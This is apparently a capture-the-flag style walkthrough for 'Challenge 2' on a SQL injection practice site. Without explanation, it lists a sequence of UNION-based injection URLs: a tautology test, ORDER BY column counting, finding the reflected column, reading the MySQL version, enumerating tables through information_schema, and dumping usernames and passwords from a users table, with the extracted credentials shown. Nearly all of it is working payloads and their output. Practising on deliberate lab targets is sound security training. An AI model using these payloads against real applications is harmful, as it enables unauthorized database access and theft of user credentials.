<h1>Challenge 2</h1>

Note- No explanation, only links with relevant step as per Challenge 1. 

 

Challenge Link- http://leettime.net/sqlninja.com/tasks/basic_ch2.php?id=1 

 
http://leettime.net/sqlninja.com/tasks/basic_ch2.php?id=1+OR+'1'='1'--+ 

Find the difference :D 

 
http://leettime.net/sqlninja.com/tasks/basic_ch2.php?id=1+ORDER+BY+4--+ 

4 columns in current table 

 
http://leettime.net/sqlninja.com/tasks/basic_ch2.php?id=1+UNION+SELECT+1,2,3,4--+ 

Result- Column 2 is vulnerable 

 
http://leettime.net/sqlninja.com/tasks/basic_ch2.php?id=1+UNION+SELECT+1,version(),3,4--+ 

MySQL Version Result- 5.6.44-cll-lve 

 
http://leettime.net/sqlninja.com/tasks/basic_ch2.php?id=1+UNION+SELECT+1,(SELECT+group_concat(table_name)+from+information_schema.tables+where+table_schema=database()),3,4--+ 

Result- 

Username is : testtable1,userlogs,users 

 
http://leettime.net/sqlninja.com/tasks/basic_ch2.php?id=1+UNION+SELECT+1,(SELECT+password+FROM+users+WHERE+ID=1),3,4--+ 

 

Result- 

Username is : injector 

Username is : khan 

 

http://leettime.net/sqlninja.com/tasks/basic_ch2.php?id=1+UNION+SELECT+1,(SELECT+group_concat(username,0x0a,password)+FROM+users+WHERE+ID=1+OR+1=1),3,4--+ 

 

Result- 

Username is : injector khan,decompiler hacktract,devilhunte dante,Zen sec-idiots,Zenodermus security-i,grayhat hacker,khan haxor,admin sadmin 

 

SAME RESULTS 

SUCCESS!! 
